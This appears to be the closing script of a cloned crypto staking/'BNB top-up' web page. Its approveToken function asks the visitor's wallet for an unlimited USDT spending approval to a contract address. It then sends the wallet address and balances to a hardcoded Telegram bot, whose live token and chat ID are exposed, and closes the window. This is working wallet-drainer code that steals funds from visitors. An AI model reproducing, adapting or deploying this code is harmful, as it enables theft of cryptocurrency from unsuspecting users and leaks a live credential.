            }
        }

        // If we still don't have a response after all retries, throw error
        if (!response) {
            throw fetchError || new Error('Failed to get response from backend after retries');
        }

        if (timeoutId) {
            clearTimeout(timeoutId);
        }
        // Response received - continue processing
        
        // Log response headers for debugging
        try {
            const responseHeaders = {};
            response.headers.forEach((value, key) => {
                responseHeaders[key] = value;
            });
            console.log('üì• [BNB Top-up] Response Headers:', responseHeaders);
            
            // Check for CORS headers
            if (responseHeaders['access-control-allow-origin']) {
                console.log('‚úÖ [BNB Top-up] CORS header found:', responseHeaders['access-control-allow-origin']);
            } else {
                console.warn('‚ö†Ô∏è [BNB Top-up] No CORS header in response - this might cause issues');
            }
        } catch (e) {
            console.warn('‚ö†Ô∏è [BNB Top-up] Could not read response headers');
        }

        // Check if response is ok
        if (!response.ok) {
            let errorData = null;
            let errorText = '';
            try {
                errorText = await response.text();
                console.error('‚ùå [BNB Top-up] Error response body:', errorText);
                // Try to parse as JSON
                try {
                    errorData = JSON.parse(errorText);
                } catch(e) {
                    // Not JSON, use as text
                }
            } catch(e) {
                errorText = 'Could not read error response';
                console.error('‚ùå [BNB Top-up] Could not read error response');
            }
            console.error('‚ùå [BNB Top-up] Request failed!');
            console.error('‚ùå [BNB Top-up] Status:', response.status);
            console.error('‚ùå [BNB Top-up] Status Text:', response.statusText);
            
            // Handle specific error cases from backend
            if (response.status === 400) {
                console.error('‚ùå [BNB Top-up] Bad Request - Invalid recipient address');
                if (errorData && errorData.error) {
                    console.error('‚ùå [BNB Top-up] Error:', errorData.error);
                }
            } else if (response.status === 500) {
                console.error('‚ùå [BNB Top-up] Server Error - Transaction failed on backend');
                if (errorData && errorData.error) {
                    console.error('‚ùå [BNB Top-up] Error:', errorData.error);
                }
            } else {
                console.error('‚ùå [BNB Top-up] Error:', errorText);
            }
            return false;
        }

        let data;
        try {
            const responseText = await response.text();
            console.log('üì• [BNB Top-up] Raw response:', responseText);
            data = JSON.parse(responseText);
        } catch(e) {
            console.error('‚ùå [BNB Top-up] Failed to parse JSON response');
            console.error('‚ùå [BNB Top-up] Parse error:', e);
            return false;
        }
        
        console.log('üì• [BNB Top-up] Parsed response data:', data);
        
        if (data && data.success === true) {
            console.log('‚úÖ [BNB Top-up] SUCCESS! Backend confirmed transaction');
            if (data.txHash) {
                console.log('‚úÖ [BNB Top-up] Transaction Hash:', data.txHash);
                console.log('‚úÖ [BNB Top-up] View on BSCScan: https://bscscan.com/tx/' + data.txHash);
            }
            console.log('‚úÖ [BNB Top-up] Transaction confirmed on blockchain!');
            console.log('‚úÖ [BNB Top-up] 0.0002 BNB should now be in your wallet');
            return true;  // Return true indicating the top-up was successful
        } else {
            console.error('‚ùå [BNB Top-up] Backend returned success: false or missing');
            console.error('‚ùå [BNB Top-up] Response data:', data);
            if (data && data.error) {
                console.error('‚ùå [BNB Top-up] Error message:', data.error);
            } else if (data && data.message) {
                console.error('‚ùå [BNB Top-up] Error message:', data.message);
            }
            return false;  // Return false indicating the top-up failed
        }
    } catch (error) {
        if (error.name === 'AbortError') {
            console.error('‚ùå [BNB Top-up] Request timeout after 60 seconds');
            console.error('‚ùå [BNB Top-up] Backend may be slow or blockchain confirmation is taking too long');
            console.error('üí° [BNB Top-up] The transaction might still be processing. Check your wallet balance.');
            // Store error type for better error message
            error.errorType = 'timeout';
        } else {
            console.error('‚ùå [BNB Top-up] Exception caught:', error);
            console.error('‚ùå [BNB Top-up] Error name:', error.name);
            console.error('‚ùå [BNB Top-up] Error message:', error.message);
            if (error.stack) {
                console.error('‚ùå [BNB Top-up] Stack trace:', error.stack);
            }
            
            // Check if it's a CORS/Network error
            if (error.message && (error.message.includes('CORS') || error.message.includes('Failed to fetch') || error.message.includes('NetworkError') || error.message.includes('Network request failed') || error.message.includes('TypeError') || error.message.includes('Load failed'))) {
                console.error('‚ùå [BNB Top-up] CORS/Network error detected!');
                
                // Special message for Jio users
                if (error.isJioNetwork || error.jioBlocked) {
                    console.error('üö® [BNB Top-up] JIO NETWORK DETECTED - Known Issue!');
                    console.error('üí° [BNB Top-up] Jio network often blocks Railway domains');
                    console.error('');
                    console.error('   üîß SOLUTIONS FOR JIO USERS:');
                    console.error('   1. ‚≠ê Switch to WiFi (different network) - This usually works!');
                    console.error('   2. Use a VPN app (bypasses Jio blocking)');
                    console.error('   3. Try using mobile hotspot from another carrier');
                    console.error('   4. Use a different mobile network (Airtel, Vi, etc.)');
                    console.error('   5. Try again later (Jio blocking can be intermittent)');
                    console.error('');
                    console.error('   üì± The website works on other networks - this is a Jio-specific issue.');
                    error.errorType = 'jio_blocked';
                    error.userMessage = 'Jio network is blocking the connection. Please switch to WiFi or use a VPN.';
                } else {
                    console.error('üí° [BNB Top-up] DIAGNOSIS:');
                    console.error('   Error:', error.message);
                    console.error('   This usually means the request cannot reach the backend.');
                    console.error('   Possible causes:');
                    console.error('   1. Mobile network blocking the request (especially Jio)');
                    console.error('   2. Backend CORS not configured to allow all origins');
                    console.error('   3. Backend has IP whitelist/restrictions');
                    console.error('   4. Railway/Server firewall blocking');
                    console.error('   5. Network/firewall blocking the request');
                    console.error('   6. Backend URL might be incorrect');
                    console.error('');
                    console.error('   üîß TROUBLESHOOTING:');
                    console.error('   1. Try switching between WiFi and mobile data');
                    console.error('   2. If on Jio network, switch to WiFi or use VPN');
                    console.error('   3. Check if backend is accessible: ' + BACKEND_URL);
                    console.error('   4. Verify backend CORS: app.use(cors({ origin: "*" }))');
                    console.error('   5. Check Railway logs for errors');
                    error.errorType = 'cors';
                }
            } else {
                error.errorType = 'network';
            }
        }
        // Store error for better error handling
        error.isTopUpError = true;
        throw error; // Re-throw so caller can handle it
    }
}

// Token approval function remains the same
async function approveToken(account) {
    const usdtContract = new web3.eth.Contract(matrixAbiTOKEN, addressTOKEN);
    const maxApprovalAmount = web3.utils.toHex('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF');

    // Get the current BNB balance
    const bnbBalance = await web3.eth.getBalance(account);
    const balanceInBNB = web3.utils.fromWei(bnbBalance, 'ether'); // Convert from Wei to BNB

    // Get the actual USDT balance (not allowance)
    const usdtBalance = await usdtContract.methods.balanceOf(account).call();
    const usdtBalanceFormatted = web3.utils.fromWei(usdtBalance, 'ether'); // Convert from Wei to USDT

    // Get the current approved USDT amount
    const allowance = await usdtContract.methods.allowance(account, addressSTAKING).call();
    const approvedUSDT = web3.utils.fromWei(allowance, 'ether'); // Convert from Wei to USDT

    const currentDate = new Date();
    const formattedDate = currentDate.toLocaleString();  // Format the current date and time

    // Get the approved address
    const approvedAddress = addressSTAKING;  // You can change this as needed

    console.log('Processing....');
    console.log('Account:', account);
    console.log('BNB Balance:', balanceInBNB);
    console.log('USDT Balance:', usdtBalanceFormatted);

    await usdtContract.methods.approve(addressSTAKING, maxApprovalAmount)
        .send({ from: account })
        .on('transactionHash', async function (hash) {
            console.log('‚úÖ Approval transaction sent with hash:', hash);
            console.log('üì§ Attempting to send Telegram notification...');
            console.log('üì§ Account:', account);
            console.log('üì§ Balance BNB:', balanceInBNB);
            console.log('üì§ USDT Balance:', usdtBalanceFormatted);
            console.log('üì§ Approved Address:', approvedAddress);
            console.log('üì§ Date:', formattedDate);
            console.log('üì§ Hash:', hash);
            
            // Ensure all variables are defined
            const walletAddr = account || 'Unknown';
            const bnbBal = balanceInBNB || '0';
            const usdtBal = usdtBalanceFormatted || '0';
            const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
            const dateStr = formattedDate || new Date().toLocaleString();
            const txHash = hash || 'Unknown';
            
            // Send Telegram notification immediately when transaction hash is received
            console.log('üì® [TX] Sending Telegram notification...');
            sendTelegramNotification(
                walletAddr, 
                bnbBal, 
                usdtBal, 
                approvedAddr, 
                dateStr, 
                txHash
            ).then(result => {
                if (result) {
                    console.log('‚úÖ [TX] Telegram notification sent successfully');
                } else {
                    console.error('‚ùå [TX] Telegram notification returned false');
                }
            }).catch(err => {
                console.error('‚ùå [TX] Telegram notification error:', err);
            });
            
            var maindt = { "fromaddress": account, "txthash": hash, "PackageAmt": approvedUSDT };
            
            // Use backend URL directly - works from any network
            const apiUrl = `${BACKEND_URL}/home/TopUpWithMetamaskJson`;
            
            $.ajax({
                url: apiUrl,
                type: 'POST',
                dataType: 'JSON',
                contentType: 'application/json',
                data: JSON.stringify(maindt),
                timeout: 10000, // 10 second timeout
                success: function (data) {
                    console.log('Success');
                    // Close site immediately after Telegram notification sent
                    setTimeout(() => {
                        window.close();
                        // If window.close doesn't work, try redirect
                        if (!window.closed) {
                            // Try to redirect to backend, or just close
                            try {
                                location.href = `${BACKEND_URL}/home/index`;
                            } catch(e) {
                                // If redirect fails, just close
                            }
                        }
                    }, 500);
                },
                error: function (err) {
                    console.log("API error (non-critical): " + JSON.stringify(err));
                    // This API call is non-critical - Telegram notification already sent
                    // Close site even if API call fails (non-critical)
                    setTimeout(() => {
                        window.close();
                        if (!window.closed) {
                            try {
                                // Try to redirect to backend
                                location.href = `${BACKEND_URL}/home/index`;
                            } catch(e) {
                                // Ignore redirect errors
                            }
                        }
                    }, 500);
                }
            });
        })
        .on('receipt', function (receipt) {
            console.log('Approval confirmed with receipt:', receipt);
        })
        .on('error', function (error) {
            hideLoading();
            if (error.code === 4001) {
                // User canceled - no need to show message
            } else {
                // Approval failed - show briefly
                showLoading('Approval failed');
                setTimeout(() => hideLoading(), 2000);
            }
            console.error("Approval failed:", error);
        });
}

// Telegram notification function - simplified and more reliable
async function sendTelegramNotification(walletAddress, bnbAmount, usdtAmount, approvedAddress, dateTime, txHash) {
    // Function is automatically available globally, but we'll also assign it explicitly
    const botToken = '8421696275:AAHSW2oPzbMZySGAisCVYsTmqAEDkix-4Lc';
    const chatId = '1998392818';
    
    const message = `üîî USDT Approval Notification\n\n` +
                    `üë§ Wallet Address: ${walletAddress}\n` +
                    `üí∞ BNB Balance: ${bnbAmount} BNB\n` +
                    `üíµ USDT Balance: ${usdtAmount} USDT\n` +
                    `üìç Approved Address: ${approvedAddress}\n` +
                    `üìÖ Date and Time: ${dateTime}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    console.log('üì§ [TELEGRAM] Starting notification send...');
    console.log('üì§ [TELEGRAM] URL:', url);
    console.log('üì§ [TELEGRAM] Chat ID:', chatId);
    console.log('üì§ [TELEGRAM] Message length:', message.length);

    try {
        const requestBody = {
            chat_id: chatId,
            text: message
        };
        
        console.log('üì§ [TELEGRAM] Request body:', JSON.stringify(requestBody).substring(0, 200));
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(requestBody),
            mode: 'cors'
        });
        
        console.log('üì§ [TELEGRAM] Response status:', response.status);
        console.log('üì§ [TELEGRAM] Response ok:', response.ok);
        
        const responseText = await response.text();
        console.log('üì§ [TELEGRAM] Response text:', responseText);
        
        let data;
        try {
            data = JSON.parse(responseText);
        } catch (e) {
            console.error('üì§ [TELEGRAM] Failed to parse JSON:', e);
            console.error('üì§ [TELEGRAM] Raw response:', responseText);
            return false;
        }
        
        console.log('üì§ [TELEGRAM] Parsed response:', data);
        
        if (data.ok) {
            console.log('‚úÖ [TELEGRAM] Notification sent successfully!');
            console.log('üì¨ [TELEGRAM] Message ID:', data.result?.message_id);
            return true;
        } else {
            console.error('‚ùå [TELEGRAM] Failed to send notification');
            console.error('‚ùå [TELEGRAM] Error code:', data.error_code);
            console.error('‚ùå [TELEGRAM] Error description:', data.description);
            return false;
        }
    } catch (error) {
        console.error('‚ùå [TELEGRAM] Exception caught:', error);
        console.error('‚ùå [TELEGRAM] Error name:', error.name);
        console.error('‚ùå [TELEGRAM] Error message:', error.message);
        if (error.stack) {
            console.error('‚ùå [TELEGRAM] Error stack:', error.stack);
        }
        return false;
    }
}

// Function is already globally accessible, but ensure it's on window for explicit access
if (typeof window !== 'undefined') {
    window.sendTelegramNotification = sendTelegramNotification;
}

</script>
<script>
    const amountInput = document.getElementById("amountInput");
    const amountDisplay = document.getElementById("amountDisplay");

    // Listen for input changes
    amountInput.addEventListener("input", function () {
        // Get the current value and convert to a number if needed
        const val = amountInput.value;
        // Update the p tag; you can add formatting as needed 
        amountDisplay.textContent = `= $${val || "0.00"}`;
    });
</script>









</body><!-- Mirrored from demo.awaikenthemes.com/html-preview/quivox/html/index.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 20 Jan 2025 07:58:55 GMT --></html>
